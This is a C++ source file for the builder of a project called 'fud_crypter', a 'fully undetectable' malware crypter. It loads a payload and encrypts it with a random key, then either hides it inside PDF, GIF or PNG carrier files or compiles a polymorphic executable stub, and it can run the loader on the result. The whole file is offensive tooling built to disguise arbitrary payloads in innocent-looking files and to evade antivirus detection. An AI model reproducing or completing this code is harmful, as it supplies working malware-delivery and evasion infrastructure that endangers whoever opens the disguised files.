#include "fud_crypter/builder/builder.hpp"
#include "fud_crypter/builder/polymorph.hpp"
#include "fud_crypter/loader.hpp"
#include <fstream>
#include <iostream>
#include <stdexcept>
#include <random>
#include <cstdlib>

namespace fud_crypter {

    Builder::Builder(const BuilderConfig& config)
    : config_(config)
    , logger_(std::make_shared<Logger>(config.verbose ? LogLevel::DEBUG : LogLevel::INFO)) {}

    bool Builder::build() {
        try {
            logger_->info("=== FUD Crypter Builder ===");
            logger_->info("Input: " + config_.input_file);
            logger_->info("Output: " + config_.output_file);
            logger_->info("Format: " + config_.format);

            auto payload = read_file(config_.input_file);
            if (payload.empty()) {
                logger_->error("Payload file is empty or cannot be read");
                return false;
            }
            logger_->success("Payload loaded: " + std::to_string(payload.size()) + " bytes");

            std::vector<uint8_t> key;
            if (!config_.key_file.empty()) {
                key = read_file(config_.key_file);
                if (key.empty()) {
                    logger_->error("Key file is empty or cannot be read");
                    return false;
                }
                logger_->info("Key loaded from file: " + std::to_string(key.size()) + " bytes");
            } else {
                key = generate_random_key(32);
                logger_->info("Generated random 256-bit key");
                if (!write_file(config_.output_file + ".key", key)) {
                    logger_->warning("Could not save key file");
                }
            }

            bool ok = false;
            if (config_.format == "pdf") {
                ok = embed_pdf(payload, key);
            } else if (config_.format == "gif") {
                ok = embed_gif(payload, key);
            } else if (config_.format == "png") {
                ok = embed_png(payload, key);
            } else if (config_.format == "exe") {
                ok = generate_stub(key);
            } else {
                logger_->error("Unsupported format: " + config_.format);
                return false;
            }

            if (!ok) {
                logger_->error("Build failed during embedding/stub generation");
                return false;
            }

            logger_->success("Build completed successfully!");

            if (config_.execute) {
                logger_->info("Executing loader on carrier file...");
                return execute_loader(config_.output_file, config_.key_file);
            }

            return true;

        } catch (const std::exception& e) {
            logger_->fatal(std::string("Exception: ") + e.what());
            return false;
        }
    }

    std::vector<uint8_t> Builder::read_file(const std::string& path) {
        std::ifstream file(path, std::ios::binary | std::ios::ate);
        if (!file) return {};
        auto size = file.tellg();
        if (size <= 0) return {};
        std::vector<uint8_t> buffer(static_cast<size_t>(size));
        file.seekg(0);
        file.read(reinterpret_cast<char*>(buffer.data()), size);
        return buffer;
    }

    bool Builder::write_file(const std::string& path, const std::vector<uint8_t>& data) {
        std::ofstream file(path, std::ios::binary | std::ios::trunc);
        if (!file) return false;
        file.write(reinterpret_cast<const char*>(data.data()), data.size());
        return true;
    }

    std::vector<uint8_t> Builder::generate_random_key(size_t size) {
        std::vector<uint8_t> key(size);
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        for (size_t i = 0; i < size; ++i) {
            key[i] = static_cast<uint8_t>(dis(gen));
        }
        return key;
    }

    bool Builder::execute_loader(const std::string& carrier, const std::string& key) {
        logger_->info("Executing loader on: " + carrier);
        LoaderConfig lcfg;
        lcfg.carrier_file = carrier;
        lcfg.key_file = key;
        lcfg.verbose = config_.verbose;
        Loader loader(lcfg);
        return loader.execute();
    }

    // ------------------------------------------------------------------
    // generate_stub IMPLEMENTÁCIÓ (EDIÓT PÓTOLJA)
    // ------------------------------------------------------------------
    bool Builder::generate_stub(const std::vector<uint8_t>& key) {
        logger_->info("Generating polymorphic stub...");
        auto payload = read_file(config_.input_file);
        if (payload.empty()) {
            logger_->error("Payload file is empty");
            return false;
        }

        auto src = PolymorphGenerator::generate_stub(payload, key, config_.polymorph);

        std::string tmp_src = config_.output_file + ".tmp.cpp";
        if (!PolymorphGenerator::save_stub_source(tmp_src, src)) {
            logger_->error("Cannot write stub source");
            return false;
        }

        std::string exe_path = config_.output_file;
        #ifdef FUD_PLATFORM_WINDOWS
        if (exe_path.find(".exe") == std::string::npos)
            exe_path += ".exe";
        #endif

        if (!PolymorphGenerator::compile_stub(tmp_src, exe_path)) {
            logger_->error("Compilation failed");
            return false;
        }

        std::remove(tmp_src.c_str());
        logger_->success("Stub generated: " + exe_path);
        return true;
    }

    // embed_pdf, embed_gif, embed_png definíciók a külön fájlokban (pdf_builder.cpp, stb.)

} // namespace fud_crypter
